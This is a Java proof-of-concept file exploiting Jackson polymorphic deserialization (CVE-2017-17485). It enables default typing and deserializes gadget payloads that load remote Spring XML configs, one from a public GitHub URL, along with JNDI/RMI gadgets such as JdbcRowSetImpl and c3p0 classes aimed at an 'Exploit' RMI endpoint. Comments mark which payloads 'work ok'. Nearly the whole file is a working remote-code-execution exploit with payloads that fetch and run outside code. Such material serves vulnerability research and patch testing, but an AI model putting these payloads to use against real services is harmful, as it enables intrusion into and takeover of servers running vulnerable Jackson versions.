package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.lang.reflect.Array;

/**
 * Created by liaoxinxi on 2017-12-11.
 */
public class TestJdbcRowSetImplPoc {
    public static void main(String args[]){
        testSpringFramework();
        //testJndiRefForwardingDataSource();
    }
    public static void testSpringFramework(){
        //String payload = "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", {\"configLocations\":[\"http://127.0.0.1:8000/spel.xml\"]}]\n";
        //String payload = "[\"com.mchange.v2.c3p0.impl.JndiRefDataSourceBase\",{\"jndiName\":\"rmi://localhost:1099/Exploit\",\"loginTimeout\":0}]";
        //not ok

        //work ok
        /*String payload = "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", " +
                "\"https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml\"]\n";*/
        /*String payload = "[\"org.springframework.context.support.GenericGroovyApplicationContext\", " +
                "\"http://127.0.0.1:8000/spel.xml\"]\n";*/
        //work ok
        //CVE-2017-17485
        String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", " +
                "\"http://127.0.0.1:8000/spel.xml\"]\n";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void testJndiRefForwardingDataSource(){
        String payload = "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"rmi://localhost:1099/Exploit\",\"loginTimeout\":0}]";
        //String payload = "[\"com.mchange.v2.c3p0.impl.JndiRefDataSourceBase\",{\"jndiName\":\"rmi://localhost:1099/Exploit\",\"loginTimeout\":0}]";
        //not ok
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void test1(){
        String payload = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}]";
        System.out.println(payload);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
            System.out.println("Should not pass");
        } catch (Throwable e) {
            //verifyException(e, "Illegal type");
            //verifyException(e, "to deserialize");
            //verifyException(e, "prevented for security reasons");
            //BeanDescription desc = e.getBeanDescription();
            //assertNotNull(desc);
            //assertEquals(NASTY_CLASS, desc.getBeanClass().getName());
        }

    }
}
